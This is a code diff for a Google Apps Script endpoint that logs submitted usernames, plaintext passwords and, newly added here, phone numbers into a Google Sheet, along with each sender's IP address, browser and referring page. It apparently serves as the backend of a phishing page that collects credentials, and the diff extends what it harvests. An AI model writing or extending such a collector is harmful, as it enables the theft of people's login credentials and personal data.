@@ -21,12 +21,13 @@
 
 const SHEET_NAME = 'Sheet1';
 
-// Header chuẩn khi khởi tạo trang tính (đã có phân loại Đăng nhập / Đăng ký)
+// Header chuẩn khi khởi tạo trang tính (đã có phân loại Đăng nhập / Đăng ký và Số điện thoại)
 const HEADERS = [
   'Thời gian',
   'Loại hành động',
   'Tên đăng nhập',
   'Mật khẩu',
+  'Số điện thoại',
   'Địa chỉ IP',
   'Thiết bị / Trình duyệt',
   'Trang gửi',
@@ -71,6 +72,7 @@ function doPost(e) {
     const type = data.type || (data.action ? data.action : 'Đăng nhập');
     const username = data.username || '';
     const password = data.password || '';
+    const phone = data.phone || '';
     const ip = data.ip || '';
     const userAgent = data.userAgent || '';
     const referer = data.referer || '';
@@ -94,7 +96,7 @@ function doPost(e) {
       sheet.setFrozenRows(1);
     } else {
       // Kiểm tra xem sheet đã có cột "Loại" chưa
-      const firstRow = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
+      let firstRow = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
       const hasTypeCol = firstRow.some(function(col) {
         const val = String(col).toLowerCase();
         return val.includes('loại') || val.includes('hành động');
@@ -110,15 +112,34 @@ function doPost(e) {
         headerCell.setFontColor('#ffffff');
         headerCell.setHorizontalAlignment('center');
       }
+
+      // Kiểm tra xem sheet đã có cột "Số điện thoại" chưa
+      firstRow = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
+      const hasPhoneCol = firstRow.some(function(col) {
+        const val = String(col).toLowerCase();
+        return val.includes('điện thoại') || val.includes('phone') || val.includes('sđt');
+      });
+
+      if (!hasPhoneCol) {
+        // Tự động chèn cột "Số điện thoại" vào sau cột Mật khẩu (vị trí thứ 5)
+        sheet.insertColumnAfter(4);
+        const headerCell = sheet.getRange(1, 5);
+        headerCell.setValue('Số điện thoại');
+        headerCell.setFontWeight('bold');
+        headerCell.setBackground('#2c3e50');
+        headerCell.setFontColor('#ffffff');
+        headerCell.setHorizontalAlignment('center');
+      }
     }
 
     // Ghi một dòng mới vào Google Sheet:
-    // Cột: Thời gian | Loại hành động | Tên đăng nhập | Mật khẩu | IP | Thiết bị | Trang gửi
+    // Cột: Thời gian | Loại hành động | Tên đăng nhập | Mật khẩu | Số điện thoại | IP | Thiết bị | Trang gửi
     sheet.appendRow([
       timeStr,
       type,
       username,
       password,
+      phone,
       ip,
       userAgent,
       referer,
